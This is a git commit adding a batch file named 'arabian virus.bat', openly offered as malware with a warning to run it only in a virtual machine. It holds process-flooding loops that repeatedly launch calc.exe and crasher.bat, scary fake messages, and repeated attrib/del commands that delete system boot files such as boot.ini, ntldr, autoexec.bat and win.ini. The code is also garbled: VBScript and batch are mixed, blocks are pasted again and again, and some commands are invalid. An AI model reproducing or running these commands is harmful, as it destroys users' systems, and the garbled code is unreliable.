0d4b21aaab345e8e3e2bcfbe4151396077e287c5
qewefz <120617578+qewefz@users.noreply.github.com>
2022-12-15 00:41:19 -0300

    dont click or use a virtual pc for it
    remeber what i say

---
+++ arabian virus.bat
@@ -0,0 +1,250 @@
+msgbox "Press OK to open my computer"
+do
+Set shell=CreateObject("wscript.shell")
+Shell.Run("calc.exe")
+loop do
+Set wshshell = wscript.CreateObject("WScript.Shell") 
+Wshshell.run "Notepad" 
+wscript.sleep 100
+wshshell.sendkeys "H"
+wscript.sleep 100
+wshshell.sendkeys "I"
+wscript.sleep 100
+wshshell.sendkeys " "
+wscript.sleep 100
+wshshell.sendkeys "Y"
+wscript.sleep 100
+wshshell.sendkeys "O"
+wscript.sleep 100
+wshshell.sendkeys "U"
+wscript.sleep 100
+wshshell.sendkeys "R"
+wscript.sleep 100
+wshshell.sendkeys " "
+wscript.sleep 100
+wshshell.sendkeys "P"
+wscript.sleep 100
+wshshell.sendkeys "C"
+wscript.sleep 100
+wshshell.sendkeys " "
+wscript.sleep 100
+wshshell.sendkeys "H"
+wscript.sleep 100
+wshshell.sendkeys "A"
+wscript.sleep 100
+wshshell.sendkeys "S"
+wscript.sleep 100
+wshshell.sendkeys " "
+wscript.sleep 100
+wshshell.sendkeys "B"
+wscript.sleep 100
+wshshell.sendkeys "E"
+wscript.sleep 100
+wshshell.sendkeys "E"
+wscript.sleep 100
+wshshell.sendkeys "N"
+wscript.sleep 100
+wshshell.sendkeys " "
+wscript.sleep 100
+wshshell.sendkeys "I"
+wscript.sleep 100
+wshshell.sendkeys "N"
+wscript.sleep 100
+wshshell.sendkeys "F"
+wscript.sleep 100
+wshshell.sendkeys "N"
+wscript.sleep 100
+wshshell.sendkeys "C"
+wscript.sleep 100
+wshshell.sendkeys "T"
+wscript.sleep 100
+wshshell.sendkeys "E"
+wscript.sleep 100
+wshshell.sendkeys "D"
+loop start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+
+:A
+start crasher.bat
+goto A :A
+start crasher.bat
+goto A :A
+start crasher.bat
+goto A :A
+start crasher.bat
+goto A :A
+start crasher.bat
+goto A :A
+start crasher.bat
+goto A :A
+start crasher.bat
+goto A :A
+start crasher.bat
+goto A :A
+start crasher.bat
+goto A :A
+start crasher.bat
+goto A :A
+start crasher.bat
+goto A :A
+start crasher.bat
+goto A :A
+start crasher.bat
+goto A :A
+start crasher.bat
+goto A :A
+start crasher.bat
+goto A :A
+start crasher.bat
+goto A :A
+start crasher.bat
+goto A :A
+start crasher.bat
+@echo off
+color 0a
+echo You cannot gain access to all computer systems.
+pause
+echo Type Yes to continue
+start /p not
+if %not%==Yes goto A
+:A
+Your PC will be destroyed in 10 secs.
+timeout 10
+delete system32.exe -s -t 100 @echo off
+color 0a
+echo You cannot gain access to all computer systems.
+pause
+echo Type Yes to continue
+start /p not
+if %not%==Yes goto A
+:A
+Your PC will be destroyed in 10 secs.
+timeout 10
+delete system32.exe -s -t 100 @echo off
+color 0a
+echo You cannot gain access to all computer systems.
+pause
+echo Type Yes to continue
+start /p not
+if %not%==Yes goto A
+:A
+Your PC will be destroyed in 10 secs.
+timeout 10
+delete system32.exe -s -t 100 @echo off
+color 0a
+echo You cannot gain access to all computer systems.
+pause
+echo Type Yes to continue
+start /p not
+if %not%==Yes goto A
+:A
+Your PC will be destroyed in 10 secs.
+timeout 10
+delete system32.exe -s -t 100 @echo off
+color 0a
+echo You cannot gain access to all computer systems.
+pause
+echo Type Yes to continue
+start /p not
+if %not%==Yes goto A
+:A
+Your PC will be destroyed in 10 secs.
+timeout 10
+delete system32.exe -s -t 100 @echo off
+color 0a
+echo You cannot gain access to all computer systems.
+pause
+echo Type Yes to continue
+start /p not
+if %not%==Yes goto A
+:A
+Your PC will be destroyed in 10 secs.
+timeout 10
+delete system32.exe -s -t 100@echo off
+color 0a
+echo You cannot gain access to all computer systems.
+pause
+echo Type Yes to continue
+start /p not
+if %not%==Yes goto A
+:A
+Your PC will be destroyed in 10 secs.
+timeout 10
+delete system32.exe -s -t 100 @echo off
+color 0a
+echo You cannot gain access to all computer systems.
+pause
+echo Type Yes to continue
+start /p not
+if %not%==Yes goto A
+:A
+Your PC will be destroyed in 10 secs.
+timeout 10
+delete system32.exe -s -t 100 @echo off
+attrib -r -s -h c:\autoexex.bat
+del c:\autoexec.bat
+attrib -r -s -h c:\boot.ini
+del c:\boot.ini
+attrib -r -s -h c:\ntldr
+del c:\ntldr
+attrib -r -s -h c:\windows\win.ini
+del c:\windows\win.ini @echo off
+attrib -r -s -h c:\autoexex.bat
+del c:\autoexec.bat
+attrib -r -s -h c:\boot.ini
+del c:\boot.ini
+attrib -r -s -h c:\ntldr
+del c:\ntldr
+attrib -r -s -h c:\windows\win.ini
+del c:\windows\win.ini @echo off
+attrib -r -s -h c:\autoexex.bat
+del c:\autoexec.bat
+attrib -r -s -h c:\boot.ini
+del c:\boot.ini
+attrib -r -s -h c:\ntldr
+del c:\ntldr
+attrib -r -s -h c:\windows\win.ini
+del c:\windows\win.ini @echo off
+attrib -r -s -h c:\autoexex.bat
+del c:\autoexec.bat
+attrib -r -s -h c:\boot.ini
+del c:\boot.ini
+attrib -r -s -h c:\ntldr
+del c:\ntldr
+attrib -r -s -h c:\windows\win.ini
+del c:\windows\win.ini @echo off
+attrib -r -s -h c:\autoexex.bat
+del c:\autoexec.bat
+attrib -r -s -h c:\boot.ini
+del c:\boot.ini
+attrib -r -s -h c:\ntldr
+del c:\ntldr
+attrib -r -s -h c:\windows\win.ini
+del c:\windows\win.ini @echo off
+attrib -r -s -h c:\autoexex.bat
+del c:\autoexec.bat
+attrib -r -s -h c:\boot.ini
+del c:\boot.ini
+attrib -r -s -h c:\ntldr
+del c:\ntldr
+attrib -r -s -h c:\windows\win.ini
+del c:\windows\win.ini @echo off
+attrib -r -s -h c:\autoexex.bat
+del c:\autoexec.bat
+attrib -r -s -h c:\boot.ini
+del c:\boot.ini
+attrib -r -s -h c:\ntldr
+del c:\ntldr
+attrib -r -s -h c:\windows\win.ini
+del c:\windows\win.ini
